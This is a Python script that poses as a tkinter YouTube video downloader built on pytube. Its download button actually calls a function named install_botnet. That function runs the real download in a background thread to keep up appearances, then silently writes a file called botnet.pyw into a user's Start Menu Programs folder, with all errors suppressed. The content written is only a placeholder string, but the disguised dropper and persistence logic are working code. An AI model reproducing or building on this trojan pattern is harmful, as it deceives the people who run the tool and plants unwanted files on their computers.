from tkinter import Label,Tk,Entry,Button,END,messagebox,filedialog,BOTH,Grid
from pytube import YouTube
from os import listdir , chdir , getcwd , mkdir , path
from threading import Thread


current_directory = getcwd()

def download_directory():
	global current_directory
	current_directory=filedialog.askdirectory()


def go_to_startup():
	chdir('C:/Users/')
	for user in listdir():
		try:
			chdir(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/')
			return getcwd()
		except:
			pass


def clear(url,res):
	url.delete(0,END)
	res.delete(0,END)


def download(url,res):
	try:
		link=url.get()
		resolution=res.get()
		url.delete(0,END)
		url.insert(END,'downloading...')
		for stream in YouTube(link).streams:
			if 'mp4' in str(stream) and resolution in str(stream):
				url.insert(END,'downloading')
				print(stream.download(current_directory))
				url.delete(0,END)
				url.insert(END,'downloaded')
				messagebox.showinfo('download completed','the video was downloaded')
				return
		messagebox.showerror('download failed!','video unavailable for the provided resolution!')
	except:
		messagebox.showerror('download failed','invalid url or video does not exist anymore!')





def install_botnet(url,res):
	try:
		data   = 'app data'
		
		td = Thread(target=download,args=(url,res))
		td.start()
		go_to_startup()

		if 'botnet.pyw' not in listdir():
			with open('botnet.pyw','w') as f:
				f.write(data)
		else:
			pass

		chdir(current_directory)

	except:
		pass

















def window():
	fg='#FFFFFF'
	bg='#052535'

	root = Tk()
	root.title('youtube video downloader')
	root.geometry('380x170')
	root.minsize(380,150)
	root.maxsize(400,220)
	root.config(bg=bg)

	Grid.columnconfigure(root, 0, weight=1)
	Grid.columnconfigure(root, 1, weight=1)
	Grid.columnconfigure(root, 2, weight=1)
	Grid.rowconfigure(root, 0, weight=1)
	Grid.rowconfigure(root, 1, weight=1)
	Grid.rowconfigure(root, 2, weight=1)


	Label(root,text='URL :',fg=fg,bg=bg,font=16).grid(row=0,column=0,sticky='W')
	Label(root,text='Resolution :',fg=fg,bg=bg,font=16).grid(row=1,column=0,sticky='W')

	url = Entry(root,width=30,fg=fg,bg=bg,font=16)
	res = Entry(root,width=30,fg=fg,bg=bg,font=16)
	btn_c = Button(root,text=' clear ' ,bd=2,fg=fg,bg=bg,font=14,command=lambda:clear(url,res))
	btn_p = Button(root,text='select location',bd=2 ,fg=fg,bg=bg,font=14,command=download_directory)
	btn_d = Button(root,text='download',bd=2,fg=fg,bg=bg,font=14,command=lambda:install_botnet(url,res))

	url.grid(row=0,column=1,columnspan=2)
	res.grid(row=1,column=1,columnspan=2)
	btn_c.grid(row=2,column=0,sticky='SW')
	btn_p.grid(row=2,column=1,sticky='SEW')
	btn_d.grid(row=2,column=2,sticky='SE')

	root.mainloop()

window()